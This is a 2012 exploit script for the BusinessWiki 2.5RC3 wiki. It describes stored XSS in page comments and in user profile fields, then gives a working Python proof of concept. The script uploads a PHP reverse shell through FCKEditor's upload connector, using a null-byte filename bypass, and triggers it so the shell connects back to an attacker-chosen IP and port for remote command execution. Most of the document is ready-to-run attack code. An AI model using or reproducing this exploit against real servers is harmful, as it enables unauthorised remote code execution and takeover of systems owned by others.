#!/usr/bin/python
 
'''
 
# Exploit Title: Stored XSS & Arbitrary File Upload Vulnerabilities in BusinessWiki.
# Date: 23/08/2012
# Exploit Author: Shai rod (@NightRang3r)
# Vendor Homepage: http://onbusinesswiki.com/
# Software Link: http://sourceforge.net/projects/businesswiki/files/
# Version: 2.5RC3
 
#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
 
 
About the Application:
======================
 
BusinessWiki is a Enterprise level Wiki available on GPL Licence. BusinessWiki bases on MediaWiki Core
 
Vulnerability Description
=========================
 
1. Stored XSS in Page Comments.
 
It is possible to inject malicious Javascript code into page comments
 
Steps to reproduce the issue:
 
1.1. Select a page.
1.2. At the bottom of the page insert the following Javascript payload into the "Comments" field: <script>alert("XSS")</script>
1.3. Click "Add".
1.4. XSS Should be triggered.
 
This XSS will execute on all users visiting this page.
 
 
2. Stored XSS In User Profile.
 
Steps to reproduce the issue:
 
2.1. Click on your uesr name at the top right of the page where it says "Logged in as: username"
2.2. Click on the "Contact Information" - "Edit this" link.
2.3. Vulnerable Fields: "Phones", "IMs", "Others" insert Javascript payload: <script>alert("XSS")</script>
2.4. Click the "Update" button.
2.5. Click the "See the changes" link,
2.6. The XSS Should be triggered.
 
This XSS will be triggered when users view your malicious profile via the "User directory".
 
 
3. Arbitrary File Upload.
 
BusinessWiki use FCKEditor, It is possible to use the following page to upload malicious files onto the server:
 
http://192.168.1.10/extensions/FCKeditor/fckeditor/editor/filemanager/connectors/uploadtest.html
 
Although FCKEditor restricts upload of certain file types it is possible to bypass this restriction.
 
A Proof of concept exploit code is provided.
 
'''
import urllib2, sys, random, string, time
 
print "################################################"
print "#  BusinessWiki Arbitrary File Upload RCE POC  #"
print "#              Coded by: Shai rod              #"
print "#                 @NightRang3r                 #"
print "#             http://exploit.co.il             #"
print "#        For Educational Purposes Only!        #"
print "################################################\r\n"
 
if len(sys.argv) < 4:
    print ('Usage: ' + sys.argv[0] + ' remote_host attacker_ip attacker_port')
    print('e.g: ' + sys.argv[0] + ' http://example.com 192.68.1.10 4444')
        sys.exit(1)
 
target = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]
shell_sleep = 10
 
print "\n[*] Generating Random File Name..."
 
chars = string.ascii_uppercase + string.digits
file_name = ''.join(random.sample(chars ,6))
 
print "[+] File Name: " + file_name
 
data  = '''
 
-----------------------------1655174106359
Content-Disposition: form-data; name="NewFile";''' + " filename=" + '"' + file_name + '.txt"' + "\n"
data += "Content-Type: text/plain\r\n"
 
data += '''
<?php
$addr=$_REQUEST['addr'];
$port=$_REQUEST['port'];
if (!($sock=fsockopen($addr,$port)))
die;
while (!feof($sock))  {
$cmd  = fgets($sock);
$pipe = popen($cmd,'r');
while (!feof($pipe))
fwrite ($sock, fgets($pipe));
pclose($pipe);
}
fclose($sock);
?>
-----------------------------1655174106359--
 
'''
 
print "[*] Uploading Shell..."
url = (target + '/extensions/FCKeditor/fckeditor/editor/filemanager/connectors/php/upload.php?time=&CurrentFolder=/' + file_name + '.php%00')
headers = {'Content-Type' : 'multipart/form-data; boundary=---------------------------1655174106359'}
req = urllib2.Request (url ,data ,headers)
response = urllib2.urlopen(req)
 
print "[+] Please setup a netcat listener on port " + port + ", Shell will be triggered in " + str(shell_sleep) + " seconds..."
time.sleep(shell_sleep)
 
print "[+] Shell Location: " + (target + "/userfiles/" + file_name + ".php&addr=" + ip + "&port=" + port)
opener = urllib2.build_opener()
trigger = opener.open(target + "/userfiles/" + file_name + ".php?addr=" + ip + "&port=" + port)
print "[X] Bye..."
